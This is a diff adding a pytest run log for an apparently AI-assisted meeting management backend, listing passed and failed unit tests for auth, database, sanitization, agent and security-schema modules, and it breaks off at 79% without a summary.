@@ -1,0 +1,1053 @@
+============================= test session starts ==============================
+collecting ... collected 359 items
+
+tests/unit/test_ai_state_manager.py::TestAIStateManager::test_state_manager_initialization PASSED [  0%]
+tests/unit/test_ai_state_manager.py::TestAIStateManager::test_create_conversation_state_success PASSED [  0%]
+tests/unit/test_ai_state_manager.py::TestAIStateManager::test_create_conversation_state_already_exists PASSED [  0%]
+tests/unit/test_ai_state_manager.py::TestAIStateManager::test_create_conversation_state_error PASSED [  1%]
+tests/unit/test_ai_state_manager.py::TestAIStateManager::test_get_conversation_state_from_memory PASSED [  1%]
+tests/unit/test_ai_state_manager.py::TestAIStateManager::test_get_conversation_state_from_database PASSED [  1%]
+tests/unit/test_ai_state_manager.py::TestAIStateManager::test_get_conversation_state_not_found PASSED [  1%]
+tests/unit/test_ai_state_manager.py::TestAIStateManager::test_update_conversation_state_success PASSED [  2%]
+tests/unit/test_ai_state_manager.py::TestAIStateManager::test_update_conversation_state_locked PASSED [  2%]
+tests/unit/test_ai_state_manager.py::TestAIStateManager::test_update_conversation_state_force_update PASSED [  2%]
+tests/unit/test_ai_state_manager.py::TestAIStateManager::test_update_conversation_state_not_found PASSED [  3%]
+tests/unit/test_ai_state_manager.py::TestAIStateManager::test_create_checkpoint_success PASSED [  3%]
+tests/unit/test_ai_state_manager.py::TestAIStateManager::test_restore_from_checkpoint_success PASSED [  3%]
+tests/unit/test_ai_state_manager.py::TestAIStateManager::test_restore_from_checkpoint_not_found PASSED [  3%]
+tests/unit/test_ai_state_manager.py::TestAIStateManager::test_clear_conversation_state_success PASSED [  4%]
+tests/unit/test_ai_state_manager.py::TestAIStateManager::test_get_active_sessions PASSED [  4%]
+tests/unit/test_ai_state_manager.py::TestAIStateManager::test_cleanup_expired_states PASSED [  4%]
+tests/unit/test_ai_state_manager.py::TestAIStateManager::test_persist_state_placeholder PASSED [  5%]
+tests/unit/test_ai_state_manager.py::TestAIStateManager::test_restore_state_placeholder PASSED [  5%]
+tests/unit/test_ai_state_manager.py::TestAIStateManager::test_clear_persisted_state_placeholder PASSED [  5%]
+tests/unit/test_ai_state_manager.py::TestAIStateManager::test_get_session_context_manager PASSED [  5%]
+tests/unit/test_ai_state_manager.py::TestGlobalStateManager::test_global_instance_exists PASSED [  6%]
+tests/unit/test_ai_state_manager.py::TestGlobalStateManager::test_global_instance_singleton PASSED [  6%]
+tests/unit/test_ai_state_manager.py::TestStateManagerIntegration::test_full_lifecycle PASSED [  6%]
+tests/unit/test_ai_state_manager.py::TestStateManagerIntegration::test_concurrent_access_simulation PASSED [  6%]
+tests/unit/test_auth_utils.py::TestCreateAccessToken::test_create_access_token_with_default_expiry PASSED [  7%]
+tests/unit/test_auth_utils.py::TestCreateAccessToken::test_create_access_token_with_custom_expiry PASSED [  7%]
+tests/unit/test_auth_utils.py::TestCreateAccessToken::test_create_access_token_includes_sanitized_jti PASSED [  7%]
+tests/unit/test_auth_utils.py::TestVerifyToken::test_verify_token_valid PASSED [  8%]
+tests/unit/test_auth_utils.py::TestVerifyToken::test_verify_token_invalid_format PASSED [  8%]
+tests/unit/test_auth_utils.py::TestVerifyToken::test_verify_token_invalid_signature PASSED [  8%]
+tests/unit/test_auth_utils.py::TestVerifyToken::test_verify_token_expired PASSED [  8%]
+tests/unit/test_auth_utils.py::TestVerifyToken::test_verify_token_missing_subject PASSED [  9%]
+tests/unit/test_auth_utils.py::TestVerifyToken::test_verify_token_malformed_jwt PASSED [  9%]
+tests/unit/test_auth_utils.py::TestVerifyToken::test_verify_token_type_validation PASSED [  9%]
+tests/unit/test_auth_utils.py::TestAuthUtilsLogging::test_create_access_token_logs_creation PASSED [ 10%]
+tests/unit/test_auth_utils.py::TestAuthUtilsLogging::test_verify_token_logs_verification PASSED [ 10%]
+tests/unit/test_auth_utils.py::TestAuthUtilsLogging::test_verify_token_logs_invalid_format PASSED [ 10%]
+tests/unit/test_auth_utils.py::TestAuthUtilsLogging::test_verify_token_logs_jwt_error PASSED [ 10%]
+tests/unit/test_auth_utils.py::TestAuthUtilsIntegration::test_token_roundtrip PASSED [ 11%]
+tests/unit/test_auth_utils.py::TestAuthUtilsIntegration::test_different_thread_ids PASSED [ 11%]
+tests/unit/test_database_service.py::TestDatabaseServiceInitialization::test_database_service_init PASSED [ 11%]
+tests/unit/test_database_service.py::TestDatabaseServiceInitialization::test_initialize_success FAILED [ 11%]
+tests/unit/test_database_service.py::TestDatabaseServiceInitialization::test_initialize_test_environment FAILED [ 12%]
+tests/unit/test_database_service.py::TestDatabaseServiceInitialization::test_initialize_with_retries FAILED [ 12%]
+tests/unit/test_database_service.py::TestDatabaseServiceInitialization::test_initialize_max_retries_exceeded PASSED [ 12%]
+tests/unit/test_database_service.py::TestDatabaseServiceInitialization::test_initialize_idempotent PASSED [ 13%]
+tests/unit/test_database_service.py::TestDatabaseServiceSessionManagement::test_get_session_context_manager PASSED [ 13%]
+tests/unit/test_database_service.py::TestDatabaseServiceSessionManagement::test_get_session_initializes_if_needed FAILED [ 13%]
+tests/unit/test_database_service.py::TestDatabaseServiceSessionManagement::test_get_session_operational_error_handling FAILED [ 13%]
+tests/unit/test_database_service.py::TestDatabaseServiceSessionManagement::test_get_session_sqlalchemy_error_handling FAILED [ 14%]
+tests/unit/test_database_service.py::TestDatabaseServiceSessionManagement::test_get_session_generic_error_handling FAILED [ 14%]
+tests/unit/test_database_service.py::TestDatabaseServiceHealthCheck::test_health_check_healthy FAILED [ 14%]
+tests/unit/test_database_service.py::TestDatabaseServiceHealthCheck::test_health_check_with_pool_status PASSED [ 15%]
+tests/unit/test_database_service.py::TestDatabaseServiceHealthCheck::test_health_check_unhealthy PASSED [ 15%]
+tests/unit/test_database_service.py::TestDatabaseServiceHealthCheck::test_health_check_initializes_if_needed FAILED [ 15%]
+tests/unit/test_database_service.py::TestDatabaseServiceMigrationCheck::test_execute_migration_check_success PASSED [ 15%]
+tests/unit/test_database_service.py::TestDatabaseServiceMigrationCheck::test_execute_migration_check_failure PASSED [ 16%]
+tests/unit/test_database_service.py::TestDatabaseServiceUserOperations::test_create_user_success PASSED [ 16%]
+tests/unit/test_database_service.py::TestDatabaseServiceCleanup::test_close_disposes_engine PASSED [ 16%]
+tests/unit/test_database_service.py::TestDatabaseServiceCleanup::test_close_when_no_engine PASSED [ 16%]
+tests/unit/test_database_service.py::TestDatabaseServiceSingleton::test_database_service_singleton_exists PASSED [ 17%]
+tests/unit/test_database_service.py::TestDatabaseServiceSingleton::test_database_service_singleton_configuration PASSED [ 17%]
+tests/unit/test_database_service.py::TestDatabaseServiceErrorHandling::test_session_error_during_operation FAILED [ 17%]
+tests/unit/test_database_service.py::TestDatabaseServiceErrorHandling::test_connection_recovery_after_operational_error FAILED [ 18%]
+tests/unit/test_database_service.py::TestDatabaseServiceAsyncOperations::test_concurrent_session_usage PASSED [ 18%]
+tests/unit/test_database_service.py::TestDatabaseServiceAsyncOperations::test_async_context_manager_cleanup PASSED [ 18%]
+tests/unit/test_database_service.py::TestDatabaseServiceConfigurationVariants::test_debug_mode_configuration FAILED [ 18%]
+tests/unit/test_database_service.py::TestDatabaseServiceConfigurationVariants::test_production_mode_configuration FAILED [ 19%]
+tests/unit/test_database_service.py::TestDatabaseServiceAdvancedOperations::test_create_user_with_duplicate_email FAILED [ 19%]
+tests/unit/test_database_service.py::TestDatabaseServiceAdvancedOperations::test_database_transaction_rollback FAILED [ 19%]
+tests/unit/test_database_service.py::TestDatabaseServiceAdvancedOperations::test_connection_pool_exhaustion PASSED [ 20%]
+tests/unit/test_database_service.py::TestDatabaseServiceAdvancedOperations::test_database_connection_timeout FAILED [ 20%]
+tests/unit/test_database_service.py::TestDatabaseServiceAdvancedOperations::test_concurrent_session_management PASSED [ 20%]
+tests/unit/test_database_service.py::TestDatabaseServiceLegacyMethods::test_get_session_maker_method FAILED [ 20%]
+tests/unit/test_error_monitoring.py::TestErrorMetric::test_error_metric_creation PASSED [ 21%]
+tests/unit/test_error_monitoring.py::TestErrorMonitor::test_error_monitor_initialization PASSED [ 21%]
+tests/unit/test_error_monitoring.py::TestErrorMonitor::test_error_monitor_default_initialization PASSED [ 21%]
+tests/unit/test_error_monitoring.py::TestErrorMonitor::test_record_error_first_occurrence PASSED [ 22%]
+tests/unit/test_error_monitoring.py::TestErrorMonitor::test_record_error_multiple_occurrences PASSED [ 22%]
+tests/unit/test_error_monitoring.py::TestErrorMonitor::test_record_error_window_cleanup PASSED [ 22%]
+tests/unit/test_error_monitoring.py::TestErrorMonitor::test_record_error_alert_threshold PASSED [ 22%]
+tests/unit/test_error_monitoring.py::TestErrorMonitor::test_trigger_alert_output PASSED [ 23%]
+tests/unit/test_error_monitoring.py::TestErrorMonitor::test_alert_rate_limiting PASSED [ 23%]
+tests/unit/test_error_monitoring.py::TestErrorMonitor::test_get_error_summary_recent PASSED [ 23%]
+tests/unit/test_error_monitoring.py::TestErrorMonitor::test_get_error_summary_empty PASSED [ 23%]
+tests/unit/test_error_monitoring.py::TestErrorMonitor::test_get_health_status_healthy PASSED [ 24%]
+tests/unit/test_error_monitoring.py::TestErrorMonitor::test_get_health_status_degraded PASSED [ 24%]
+tests/unit/test_error_monitoring.py::TestErrorMonitor::test_get_health_status_unhealthy PASSED [ 24%]
+tests/unit/test_error_monitoring.py::TestGlobalErrorMonitor::test_global_error_monitor_exists PASSED [ 25%]
+tests/unit/test_error_monitoring.py::TestGlobalErrorMonitor::test_record_error_convenience_function PASSED [ 25%]
+tests/unit/test_error_monitoring.py::TestGlobalErrorMonitor::test_get_error_summary_convenience_function PASSED [ 25%]
+tests/unit/test_error_monitoring.py::TestGlobalErrorMonitor::test_get_monitoring_health_convenience_function PASSED [ 25%]
+tests/unit/test_error_monitoring.py::TestErrorMonitorEdgeCases::test_record_error_without_optional_params PASSED [ 26%]
+tests/unit/test_error_monitoring.py::TestErrorMonitorEdgeCases::test_error_metric_path_deduplication PASSED [ 26%]
+tests/unit/test_error_monitoring.py::TestErrorMonitorEdgeCases::test_error_metric_status_code_deduplication PASSED [ 26%]
+tests/unit/test_error_monitoring.py::TestErrorMonitorEdgeCases::test_window_edge_case_exactly_at_cutoff FAILED [ 27%]
+tests/unit/test_error_monitoring.py::TestErrorMonitorEdgeCases::test_multiple_error_types_independence PASSED [ 27%]
+tests/unit/test_error_monitoring.py::TestErrorMonitorPerformance::test_large_number_of_errors PASSED [ 27%]
+tests/unit/test_error_monitoring.py::TestErrorMonitorPerformance::test_memory_usage_with_window_cleanup PASSED [ 27%]
+tests/unit/test_exceptions.py::TestBoardroomException::test_boardroom_exception_basic FAILED [ 28%]
+tests/unit/test_exceptions.py::TestBoardroomException::test_boardroom_exception_with_all_params PASSED [ 28%]
+tests/unit/test_exceptions.py::TestBoardroomException::test_boardroom_exception_to_dict PASSED [ 28%]
+tests/unit/test_exceptions.py::TestBoardroomException::test_boardroom_exception_details_default PASSED [ 28%]
+tests/unit/test_exceptions.py::TestValidationException::test_validation_exception_basic PASSED [ 29%]
+tests/unit/test_exceptions.py::TestValidationException::test_validation_exception_with_field PASSED [ 29%]
+tests/unit/test_exceptions.py::TestValidationException::test_validation_exception_with_details PASSED [ 29%]
+tests/unit/test_exceptions.py::TestAuthenticationException::test_authentication_exception_default PASSED [ 30%]
+tests/unit/test_exceptions.py::TestAuthenticationException::test_authentication_exception_custom_message PASSED [ 30%]
+tests/unit/test_exceptions.py::TestAuthenticationException::test_authentication_exception_with_details PASSED [ 30%]
+tests/unit/test_exceptions.py::TestAuthorizationException::test_authorization_exception_default PASSED [ 30%]
+tests/unit/test_exceptions.py::TestAuthorizationException::test_authorization_exception_custom_message PASSED [ 31%]
+tests/unit/test_exceptions.py::TestResourceNotFoundException::test_resource_not_found_basic PASSED [ 31%]
+tests/unit/test_exceptions.py::TestResourceNotFoundException::test_resource_not_found_with_id PASSED [ 31%]
+tests/unit/test_exceptions.py::TestResourceNotFoundException::test_resource_not_found_with_details PASSED [ 32%]
+tests/unit/test_exceptions.py::TestConflictException::test_conflict_exception_basic PASSED [ 32%]
+tests/unit/test_exceptions.py::TestConflictException::test_conflict_exception_with_resource PASSED [ 32%]
+tests/unit/test_exceptions.py::TestDatabaseException::test_database_exception_default PASSED [ 32%]
+tests/unit/test_exceptions.py::TestDatabaseException::test_database_exception_custom_message PASSED [ 33%]
+tests/unit/test_exceptions.py::TestExternalServiceException::test_external_service_exception_basic PASSED [ 33%]
+tests/unit/test_exceptions.py::TestExternalServiceException::test_external_service_exception_custom_message PASSED [ 33%]
+tests/unit/test_exceptions.py::TestExternalServiceException::test_external_service_exception_with_details PASSED [ 33%]
+tests/unit/test_exceptions.py::TestRateLimitException::test_rate_limit_exception_default PASSED [ 34%]
+tests/unit/test_exceptions.py::TestRateLimitException::test_rate_limit_exception_custom_message PASSED [ 34%]
+tests/unit/test_exceptions.py::TestBusinessLogicException::test_business_logic_exception_basic PASSED [ 34%]
+tests/unit/test_exceptions.py::TestBusinessLogicException::test_business_logic_exception_with_rule PASSED [ 35%]
+tests/unit/test_exceptions.py::TestConfigurationException::test_configuration_exception_basic PASSED [ 35%]
+tests/unit/test_exceptions.py::TestConfigurationException::test_configuration_exception_with_key PASSED [ 35%]
+tests/unit/test_exceptions.py::TestUtilityFunctions::test_raise_not_found_basic PASSED [ 35%]
+tests/unit/test_exceptions.py::TestUtilityFunctions::test_raise_not_found_with_id PASSED [ 36%]
+tests/unit/test_exceptions.py::TestUtilityFunctions::test_raise_validation_error_basic PASSED [ 36%]
+tests/unit/test_exceptions.py::TestUtilityFunctions::test_raise_validation_error_with_field PASSED [ 36%]
+tests/unit/test_exceptions.py::TestUtilityFunctions::test_raise_auth_error_default PASSED [ 37%]
+tests/unit/test_exceptions.py::TestUtilityFunctions::test_raise_auth_error_custom PASSED [ 37%]
+tests/unit/test_exceptions.py::TestUtilityFunctions::test_raise_permission_error_default PASSED [ 37%]
+tests/unit/test_exceptions.py::TestUtilityFunctions::test_raise_permission_error_custom PASSED [ 37%]
+tests/unit/test_exceptions.py::TestUtilityFunctions::test_raise_conflict_error_basic PASSED [ 38%]
+tests/unit/test_exceptions.py::TestUtilityFunctions::test_raise_conflict_error_with_resource PASSED [ 38%]
+tests/unit/test_exceptions.py::TestUtilityFunctions::test_raise_database_error_default PASSED [ 38%]
+tests/unit/test_exceptions.py::TestUtilityFunctions::test_raise_database_error_custom PASSED [ 38%]
+tests/unit/test_exceptions.py::TestUtilityFunctions::test_raise_business_logic_error_basic PASSED [ 39%]
+tests/unit/test_exceptions.py::TestUtilityFunctions::test_raise_business_logic_error_with_rule PASSED [ 39%]
+tests/unit/test_exceptions.py::TestExceptionInheritance::test_all_exceptions_inherit_from_boardroom_exception PASSED [ 39%]
+tests/unit/test_exceptions.py::TestExceptionInheritance::test_all_exceptions_inherit_from_base_exception PASSED [ 40%]
+tests/unit/test_exceptions.py::TestExceptionSerialization::test_exception_to_dict_structure PASSED [ 40%]
+tests/unit/test_exceptions.py::TestExceptionSerialization::test_exception_json_serializable PASSED [ 40%]
+tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_agent_initialization PASSED [ 40%]
+tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_get_model_kwargs_development FAILED [ 41%]
+tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_get_model_kwargs_production FAILED [ 41%]
+tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_get_connection_pool_success PASSED [ 41%]
+tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_get_connection_pool_failure_production PASSED [ 42%]
+tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_chat_success FAILED [ 42%]
+tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_chat_with_token_usage FAILED [ 42%]
+tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_chat_llm_error_retry FAILED [ 42%]
+tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_chat_max_retries_exceeded FAILED [ 43%]
+tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_tool_call_success PASSED [ 43%]
+tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_tool_call_no_tools PASSED [ 43%]
+tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_tool_call_tool_not_found FAILED [ 44%]
+tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_tool_call_execution_error PASSED [ 44%]
+tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_should_continue_no_tool_calls PASSED [ 44%]
+tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_should_continue_with_tool_calls PASSED [ 44%]
+tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_create_graph_success FAILED [ 45%]
+tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_create_graph_no_checkpointer FAILED [ 45%]
+tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_get_response_success FAILED [ 45%]
+tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_get_stream_response FAILED [ 45%]
+tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_get_chat_history FAILED [ 46%]
+tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_clear_chat_history FAILED [ 46%]
+tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_process_messages PASSED [ 46%]
+tests/unit/test_langgraph_graph.py::TestAIOperationMetrics::test_metrics_initialization PASSED [ 47%]
+tests/unit/test_langgraph_graph.py::TestAIOperationMetrics::test_metrics_completion_success PASSED [ 47%]
+tests/unit/test_langgraph_graph.py::TestAIOperationMetrics::test_metrics_completion_failure PASSED [ 47%]
+tests/unit/test_langgraph_graph.py::TestTokenUsage::test_token_usage_calculation PASSED [ 47%]
+tests/unit/test_langgraph_graph.py::TestTokenUsage::test_token_usage_zero_values PASSED [ 48%]
+tests/unit/test_meeting_management_tools.py::TestCreateMeetingAgendaTool::test_tool_metadata PASSED [ 48%]
+tests/unit/test_meeting_management_tools.py::TestCreateMeetingAgendaTool::test_create_basic_agenda PASSED [ 48%]
+tests/unit/test_meeting_management_tools.py::TestCreateMeetingAgendaTool::test_create_agenda_with_additional_items PASSED [ 49%]
+tests/unit/test_meeting_management_tools.py::TestCreateMeetingAgendaTool::test_time_allocation_calculation FAILED [ 49%]
+tests/unit/test_meeting_management_tools.py::TestCreateMeetingAgendaTool::test_async_execution PASSED [ 49%]
+tests/unit/test_meeting_management_tools.py::TestCreateMeetingAgendaTool::test_tool_execution_error_handling PASSED [ 49%]
+tests/unit/test_meeting_management_tools.py::TestDecisionSupportTool::test_tool_metadata PASSED [ 50%]
+tests/unit/test_meeting_management_tools.py::TestDecisionSupportTool::test_analyze_decision_with_criteria PASSED [ 50%]
+tests/unit/test_meeting_management_tools.py::TestDecisionSupportTool::test_analyze_decision_default_criteria PASSED [ 50%]
+tests/unit/test_meeting_management_tools.py::TestDecisionSupportTool::test_scoring_consistency PASSED [ 50%]
+tests/unit/test_meeting_management_tools.py::TestDecisionSupportTool::test_async_execution PASSED [ 51%]
+tests/unit/test_meeting_management_tools.py::TestGenerateMeetingMinutesTool::test_tool_metadata PASSED [ 51%]
+tests/unit/test_meeting_management_tools.py::TestGenerateMeetingMinutesTool::test_generate_minutes_basic PASSED [ 51%]
+tests/unit/test_meeting_management_tools.py::TestGenerateMeetingMinutesTool::test_action_items_structure PASSED [ 52%]
+tests/unit/test_meeting_management_tools.py::TestGenerateMeetingMinutesTool::test_empty_lists_handling PASSED [ 52%]
+tests/unit/test_meeting_management_tools.py::TestGenerateMeetingMinutesTool::test_async_execution PASSED [ 52%]
+tests/unit/test_meeting_management_tools.py::TestGenerateMeetingMinutesTool::test_date_formatting PASSED [ 52%]
+tests/unit/test_meeting_management_tools.py::TestToolInstances::test_tool_instances_exist PASSED [ 53%]
+tests/unit/test_meeting_management_tools.py::TestToolInstances::test_tool_names_unique PASSED [ 53%]
+tests/unit/test_meeting_management_tools.py::TestInputSchemas::test_meeting_agenda_input_validation PASSED [ 53%]
+tests/unit/test_meeting_management_tools.py::TestInputSchemas::test_decision_support_input_validation PASSED [ 54%]
+tests/unit/test_meeting_management_tools.py::TestInputSchemas::test_meeting_minutes_input_validation PASSED [ 54%]
+tests/unit/test_sanitization.py::TestSanitizeString::test_sanitize_string_basic PASSED [ 54%]
+tests/unit/test_sanitization.py::TestSanitizeString::test_sanitize_string_html_escape PASSED [ 54%]
+tests/unit/test_sanitization.py::TestSanitizeString::test_sanitize_string_remove_script_tags FAILED [ 55%]
+tests/unit/test_sanitization.py::TestSanitizeString::test_sanitize_string_remove_null_bytes FAILED [ 55%]
+tests/unit/test_sanitization.py::TestSanitizeString::test_sanitize_string_non_string_input PASSED [ 55%]
+tests/unit/test_sanitization.py::TestSanitizeString::test_sanitize_string_complex_html PASSED [ 55%]
+tests/unit/test_sanitization.py::TestSanitizeEmail::test_sanitize_email_valid PASSED [ 56%]
+tests/unit/test_sanitization.py::TestSanitizeEmail::test_sanitize_email_uppercase PASSED [ 56%]
+tests/unit/test_sanitization.py::TestSanitizeEmail::test_sanitize_email_invalid_format FAILED [ 56%]
+tests/unit/test_sanitization.py::TestSanitizeEmail::test_sanitize_email_with_html PASSED [ 57%]
+tests/unit/test_sanitization.py::TestSanitizeEmail::test_sanitize_email_malicious_input PASSED [ 57%]
+tests/unit/test_sanitization.py::TestSanitizeDict::test_sanitize_dict_simple PASSED [ 57%]
+tests/unit/test_sanitization.py::TestSanitizeDict::test_sanitize_dict_nested PASSED [ 57%]
+tests/unit/test_sanitization.py::TestSanitizeDict::test_sanitize_dict_with_lists PASSED [ 58%]
+tests/unit/test_sanitization.py::TestSanitizeList::test_sanitize_list_simple PASSED [ 58%]
+tests/unit/test_sanitization.py::TestSanitizeList::test_sanitize_list_with_html PASSED [ 58%]
+tests/unit/test_sanitization.py::TestSanitizeList::test_sanitize_list_nested PASSED [ 59%]
+tests/unit/test_sanitization.py::TestValidatePasswordStrength::test_validate_password_strength_valid PASSED [ 59%]
+tests/unit/test_sanitization.py::TestValidatePasswordStrength::test_validate_password_strength_too_short PASSED [ 59%]
+tests/unit/test_sanitization.py::TestValidatePasswordStrength::test_validate_password_strength_no_uppercase PASSED [ 59%]
+tests/unit/test_sanitization.py::TestValidatePasswordStrength::test_validate_password_strength_no_lowercase PASSED [ 60%]
+tests/unit/test_sanitization.py::TestValidatePasswordStrength::test_validate_password_strength_no_number PASSED [ 60%]
+tests/unit/test_sanitization.py::TestValidatePasswordStrength::test_validate_password_strength_no_special PASSED [ 60%]
+tests/unit/test_sanitization.py::TestSanitizeFilename::test_sanitize_filename_normal PASSED [ 61%]
+tests/unit/test_sanitization.py::TestSanitizeFilename::test_sanitize_filename_dangerous_chars PASSED [ 61%]
+tests/unit/test_sanitization.py::TestSanitizeFilename::test_sanitize_filename_path_traversal FAILED [ 61%]
+tests/unit/test_sanitization.py::TestSanitizeFilename::test_sanitize_filename_null_bytes PASSED [ 61%]
+tests/unit/test_sanitization.py::TestSanitizeFilename::test_sanitize_filename_too_long PASSED [ 62%]
+tests/unit/test_sanitization.py::TestSanitizeSqlLikePattern::test_sanitize_sql_like_pattern_normal FAILED [ 62%]
+tests/unit/test_sanitization.py::TestSanitizeSqlLikePattern::test_sanitize_sql_like_pattern_special_chars PASSED [ 62%]
+tests/unit/test_sanitization.py::TestSanitizeSqlLikePattern::test_sanitize_sql_like_pattern_backslash PASSED [ 62%]
+tests/unit/test_sanitization.py::TestValidateUuidString::test_validate_uuid_string_valid PASSED [ 63%]
+tests/unit/test_sanitization.py::TestValidateUuidString::test_validate_uuid_string_invalid PASSED [ 63%]
+tests/unit/test_sanitization.py::TestSanitizeJsonData::test_sanitize_json_data_simple PASSED [ 63%]
+tests/unit/test_sanitization.py::TestSanitizeJsonData::test_sanitize_json_data_nested PASSED [ 64%]
+tests/unit/test_sanitization.py::TestSanitizeJsonData::test_sanitize_json_data_max_depth PASSED [ 64%]
+tests/unit/test_sanitization.py::TestSanitizeJsonData::test_sanitize_json_data_large_dict PASSED [ 64%]
+tests/unit/test_sanitization.py::TestSanitizeJsonData::test_sanitize_json_data_large_list PASSED [ 64%]
+tests/unit/test_sanitization.py::TestValidateIpAddress::test_validate_ip_address_ipv4 PASSED [ 65%]
+tests/unit/test_sanitization.py::TestValidateIpAddress::test_validate_ip_address_ipv6 PASSED [ 65%]
+tests/unit/test_sanitization.py::TestValidateIpAddress::test_validate_ip_address_invalid PASSED [ 65%]
+tests/unit/test_sanitization.py::TestSanitizeUrl::test_sanitize_url_valid PASSED [ 66%]
+tests/unit/test_sanitization.py::TestSanitizeUrl::test_sanitize_url_dangerous_schemes FAILED [ 66%]
+tests/unit/test_sanitization.py::TestSanitizeUrl::test_sanitize_url_invalid_scheme PASSED [ 66%]
+tests/unit/test_sanitization.py::TestSanitizeUrl::test_sanitize_url_malformed FAILED [ 66%]
+tests/unit/test_sanitization.py::TestValidateContentType::test_validate_content_type_valid PASSED [ 67%]
+tests/unit/test_sanitization.py::TestValidateContentType::test_validate_content_type_with_parameters PASSED [ 67%]
+tests/unit/test_sanitization.py::TestValidateContentType::test_validate_content_type_invalid PASSED [ 67%]
+tests/unit/test_sanitization.py::TestSanitizeHeaderValue::test_sanitize_header_value_normal PASSED [ 67%]
+tests/unit/test_sanitization.py::TestSanitizeHeaderValue::test_sanitize_header_value_remove_newlines PASSED [ 68%]
+tests/unit/test_sanitization.py::TestSanitizeHeaderValue::test_sanitize_header_value_remove_null_bytes PASSED [ 68%]
+tests/unit/test_sanitization.py::TestSanitizeHeaderValue::test_sanitize_header_value_length_limit PASSED [ 68%]
+tests/unit/test_sanitization.py::TestSanitizationIntegration::test_comprehensive_sanitization PASSED [ 69%]
+tests/unit/test_sanitization.py::TestSanitizationEdgeCases::test_sanitize_string_advanced_xss_attempts FAILED [ 69%]
+tests/unit/test_sanitization.py::TestSanitizationEdgeCases::test_sanitize_string_sql_injection_attempts FAILED [ 69%]
+tests/unit/test_sanitization.py::TestSanitizationEdgeCases::test_sanitize_string_command_injection_attempts FAILED [ 69%]
+tests/unit/test_sanitization.py::TestSanitizationEdgeCases::test_sanitize_string_unicode_bypass_attempts PASSED [ 70%]
+tests/unit/test_sanitization.py::TestSanitizationEdgeCases::test_sanitize_string_null_byte_variations PASSED [ 70%]
+tests/unit/test_sanitization.py::TestSanitizationEdgeCases::test_sanitize_string_empty_and_whitespace FAILED [ 70%]
+tests/unit/test_sanitization.py::TestSanitizationEdgeCases::test_sanitize_email_advanced_validation PASSED [ 71%]
+tests/unit/test_sanitization.py::TestSanitizationEdgeCases::test_sanitize_email_internationalized_domains PASSED [ 71%]
+tests/unit/test_sanitization.py::TestSanitizationEdgeCases::test_sanitize_dict_deep_nesting_attack FAILED [ 71%]
+tests/unit/test_sanitization.py::TestSanitizationEdgeCases::test_sanitize_list_large_list_attack PASSED [ 71%]
+tests/unit/test_sanitization.py::TestSanitizationEdgeCases::test_sanitize_filename_path_traversal_variants FAILED [ 72%]
+tests/unit/test_sanitization.py::TestSanitizationEdgeCases::test_sanitize_filename_reserved_names PASSED [ 72%]
+tests/unit/test_sanitization.py::TestSanitizationEdgeCases::test_validate_password_strength_comprehensive FAILED [ 72%]
+tests/unit/test_sanitization.py::TestSanitizationEdgeCases::test_sanitize_sql_like_pattern_comprehensive PASSED [ 72%]
+tests/unit/test_sanitization.py::TestSanitizationEdgeCases::test_validate_uuid_string_format_variations FAILED [ 73%]
+tests/unit/test_sanitization.py::TestSanitizationEdgeCases::test_sanitize_json_data_attack_vectors PASSED [ 73%]
+tests/unit/test_sanitization.py::TestSanitizationEdgeCases::test_validate_ip_address_edge_cases PASSED [ 73%]
+tests/unit/test_sanitization.py::TestSanitizationEdgeCases::test_sanitize_url_comprehensive_attacks FAILED [ 74%]
+tests/unit/test_sanitization.py::TestSanitizationEdgeCases::test_validate_content_type_edge_cases PASSED [ 74%]
+tests/unit/test_sanitization.py::TestSanitizationEdgeCases::test_sanitize_header_value_injection_attacks PASSED [ 74%]
+tests/unit/test_sanitization.py::TestSanitizationEdgeCases::test_sanitization_performance_with_large_data PASSED [ 74%]
+tests/unit/test_sanitization.py::TestSanitizationSecurityBoundaries::test_maximum_input_sizes PASSED [ 75%]
+tests/unit/test_sanitization.py::TestSanitizationSecurityBoundaries::test_sanitization_consistency PASSED [ 75%]
+tests/unit/test_sanitization.py::TestSanitizationSecurityBoundaries::test_sanitization_immutability PASSED [ 75%]
+tests/unit/test_sanitization.py::TestSanitizationSecurityBoundaries::test_sanitization_encoding_preservation PASSED [ 76%]
+tests/unit/test_security_schemas.py::TestSecurityLevel::test_security_level_values PASSED [ 76%]
+tests/unit/test_security_schemas.py::TestSecurityLevel::test_security_level_comparison PASSED [ 76%]
+tests/unit/test_security_schemas.py::TestSecretType::test_secret_type_values PASSED [ 76%]
+tests/unit/test_security_schemas.py::TestSecretType::test_secret_type_usage PASSED [ 77%]
+tests/unit/test_security_schemas.py::TestRotationPolicy::test_rotation_policy_default_values PASSED [ 77%]
+tests/unit/test_security_schemas.py::TestRotationPolicy::test_rotation_policy_custom_values PASSED [ 77%]
+tests/unit/test_security_schemas.py::TestRotationPolicy::test_rotation_policy_validation_warning_days PASSED [ 77%]
+tests/unit/test_security_schemas.py::TestRotationPolicy::test_rotation_policy_edge_cases FAILED [ 78%]
+tests/unit/test_security_schemas.py::TestRotationPolicy::test_rotation_policy_invalid_ranges PASSED [ 78%]
+tests/unit/test_security_schemas.py::TestEncryptionConfig::test_encryption_config_defaults PASSED [ 78%]
+tests/unit/test_security_schemas.py::TestEncryptionConfig::test_encryption_config_custom_values PASSED [ 79%]
+tests/unit/test_security_schemas.py::TestEncryptionConfig::test_encryption_config_validation PASSED [ 79%]
